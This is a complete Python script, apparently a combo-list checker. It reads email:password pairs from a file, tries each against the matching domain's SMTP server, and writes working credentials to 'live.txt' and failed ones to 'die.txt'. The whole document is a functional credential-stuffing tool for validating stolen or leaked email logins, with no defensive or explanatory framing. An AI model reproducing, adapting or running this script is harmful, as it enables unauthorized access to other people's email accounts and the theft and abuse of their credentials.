import smtplib
import time
from termcolor import colored

LIVE_FILE = "live.txt"
DIE_FILE = "die.txt"
EMPAS_FILE = "empas.txt"

def get_smtp_server(email):
    domain = email.split("@")[1]
    smtp_host = "smtp." + domain
    return smtp_host

def login(email, password):
    smtp_host = get_smtp_server(email)
    if smtp_host is None:
        return False

    try:
        smtp_port = 587 # default SMTP port is 587
        smtp = smtplib.SMTP(smtp_host, smtp_port, timeout=10)
        smtp.starttls()
        smtp.login(email, password)
        smtp.quit()
        return True
    except:
        return False

start_time = time.time()

with open(EMPAS_FILE) as f:
    lines = f.readlines()

for line in lines:
    email, password = line.strip().split(":")

    if login(email, password):
        print(colored("LIVE: " + email, "green"))
        with open(LIVE_FILE, "a") as f:
            f.write(f"{email}:{password}\n")
    else:
        print(colored("DIE: " + email, "red"))
        with open(DIE_FILE, "a") as f:
            f.write(f"{email}:{password}\n")

end_time = time.time() 
elapsed_time = end_time - start_time 
print(colored(f"\nElapsed time: {elapsed_time:.2f} seconds", "yellow"))
